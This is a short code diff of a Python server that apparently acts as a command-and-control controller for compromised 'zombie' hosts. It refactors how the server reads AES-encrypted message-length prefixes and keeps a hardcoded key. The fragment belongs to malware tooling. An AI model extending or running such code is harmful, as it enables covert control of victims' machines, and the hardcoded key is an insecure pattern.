@@ -26,6 +26,9 @@ Tunnels = dict()
 # 文件传输状态管理：{rouji_id: {"in_transfer": bool, "client_socket": socket, "file_handle": object, "file_size": int, "received_size": int, "save_path": str}}
 transfer_states = {}
 
+# C2 帧协议：AES 加密后的长度前缀固定为 44 字节（base64(IV 16 + 1 个 AES 块 16)）
+C2_FRAME_HEADER_LEN = 44
+
 def aes_encrypt(plaintext: bytes, key: bytes) -> str:
     iv = os.urandom(AES.block_size)
     cipher = AES.new(key, AES.MODE_CBC, iv)
@@ -100,8 +103,8 @@ def recv_exactly(client_socket, n):
     return buf
 
 def recv_result(client_socket):
-    # 1. 读取 44 字节 AES 加密的长度前缀（循环累积防 TCP 拆包）
-    length_bytes = aes_decrypt(recv_exactly(client_socket, 44), b'0123456789abcdef')
+    # 1. 读取 C2_FRAME_HEADER_LEN(44) 字节 AES 加密的长度前缀（循环累积防 TCP 拆包）
+    length_bytes = aes_decrypt(recv_exactly(client_socket, C2_FRAME_HEADER_LEN), b'0123456789abcdef')
     # 2. 解包获取实际数据长度
     data_length = int(length_bytes.decode('utf-8'))
     # 3. 根据长度读取实际数据（data_length 为 0 时返回空字节）
